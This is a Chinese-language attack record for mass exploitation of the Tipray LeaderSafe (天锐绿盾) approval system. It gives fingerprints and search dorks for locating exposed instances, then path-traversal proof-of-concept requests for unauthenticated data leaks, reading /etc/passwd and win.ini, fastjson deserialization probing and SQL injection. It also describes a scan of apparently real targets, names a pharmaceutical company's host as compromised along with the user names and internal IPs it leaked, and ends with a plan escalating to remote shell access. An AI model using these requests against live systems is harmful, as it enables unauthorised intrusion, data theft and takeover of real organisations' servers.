# 天锐绿盾审批系统通杀批量验证实战记录

> 来源于 Day漏洞库 35 条漏洞报告提炼，2026-07-03 实战验证。

## 产品指纹

- 入口路径: `/trwfe/`
- Body特征: `location.href=location.href+"trwfe"`
- 默认端口: 31001 / 8280 / 40001
- 厂商关键词: tipray / ldsafe / sztipray / trld / dlp / ld.
- 请求格式: POST json `{"total":N,"rows":[...]}`

## 资产筛选

```python
# 从目标CSV中筛选天锐绿盾资产
tipray_keywords = ['tipray', 'ldsafe', 'sztipray', 'trld', 'dlp', 'ld.']
# 计分制：直接匹配+3, 功能子域+2, 缩写+1
# 阈值 >= 2 即入选
```

## 已验证的POC端点清单

### Tier 1: 信息泄露（无风险探路）

| 方法 | 路径 | 正常响应 | 判断标准 |
|------|------|---------|---------|
| POST | `/trwfe/login.jsp/.%2e/config/getConfigValues.do` | 200+JSON | 返回系统配置数据 |
| POST | `/trwfe/user/findUserPage.do` | 200+JSON | 返回用户列表（带手机/邮箱） |
| POST | `/trwfe/service/.%2E/user/findOnlineUserForPage.do` | 200+JSON | **最易出洞**，无认证即可访问 |
| POST | `/trwfe/login.jsp/..;/config/getConfigValues.do` | 200+JSON | 分号截断变体 |

最常见的是在线用户接口默认无认证，直接泄露姓名+IP+在线时长。

### Tier 2: 文件读取

| 方法 | 路径 | 说明 |
|------|------|------|
| GET | `/trwfe/service/.%2E/file/downFileByconfirm.do?dstPath=C:\\Windows\\win.ini&fileName=&processInstanceIds=` | Windows读win.ini |
| GET | `/trwfe/service/.%2E/file/downFileByconfirm.do?dstPath=/etc/passwd&fileName=&processInstanceIds=` | Linux读passwd |

文件读取接口通常需要认证(401)，但部分版本无认证可读。

### Tier 3: fastjson RCE探测

| 方法 | 路径 | 判断标准 |
|------|------|---------|
| POST | `/trwfe/login.jsp/.%2e/rest/ext/mail/update/{mailId}` | 500/400=可能触发解析 |
| POST | `/trwfe/ws/taskCommon/endCallback` | 200+返回业务错误=接口无认证 |
| POST | `/trwfe/login.jsp/..;/rest/ext/findUserTrustees` | 400/500=路径穿越成功 |
| POST | `/trwfe/login.jsp/.%2e/rest/conf/editConfigVal` | 400/500=路径穿越成功 |
| POST | `/trwfe/login.jsp/.%2e/task/updateFilePrintParamsD.do` | 400/500=路径穿越成功 |

检测payload: `{"@type":"java.lang.Runtime"}` — 不触发RCE，仅检查fastjson是否解析@type。

### Tier 4: SQL注入

| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/trwfe/login.jsp/.%2e/role/findRolePage.do` | 参数可注入 |
| POST | `/trwfe/service/.%2E/menu/findModulePage.do` | 分页参数 |
| POST | `/trwfe/service/.%2E/dept/findDeptPage.do` | 部门分页 |
| POST | `/trwfe/service/.%2E/user/findUserPageExcludeCurrentUser.do` | 用户列表 |

### 文件上传

| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/trwfe/service/.%2E/file/addUpFile.do` | 需要认证(401) |
| POST | `/trwfe/service/.%2E/config/uploadWxFile.do` | 返回false=接口存在但需认证 |

## 2026-07-03 实战扫描结果

**扫描目标数**: 27（从480行资产表筛选）→ 8存活 → 1个确认漏洞

**关键命中**: dlp.tk-pharm.com:8280 — 天科制药DLP系统

| 漏洞类型 | 路径 | 详情 |
|---------|------|------|
| 在线用户信息泄露 | `/trwfe/service/.%2E/user/findOnlineUserForPage.do` | 11个在线用户(姓名+IP+时长)，泄露内网IP段10.0.x.x |
| findModulePage可访问 | `/trwfe/service/.%2E/menu/findModulePage.do` | 返回3条菜单数据，无认证 |

**其他存活目标近况**:
- sztipray.cn/com: 厂商官网，trwfe路径404（非客户系统）
- pre.tipray.com / ldsafe.com: .%2e接口返回401（需要认证）
- trld.ylhgp.com: 连接被重置（安全设备拦截）

## 鹰图搜索语法

```
# 最精准
app="TIPPAY-绿盾审批系统"

# 次选
body="location.href=location.href+\"trwfe\";" || body="天锐绿盾"

# 绿盘（同厂商另一产品）
body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"
```

## 攻击策略

1. 先用在线用户接口探路（无风险确认漏洞存在）
2. 再打fastjson反序列化（高危getshell）
3. SQL注入保底（中危）
4. 文件上传/文件读取（配合信息泄露扩大战果）
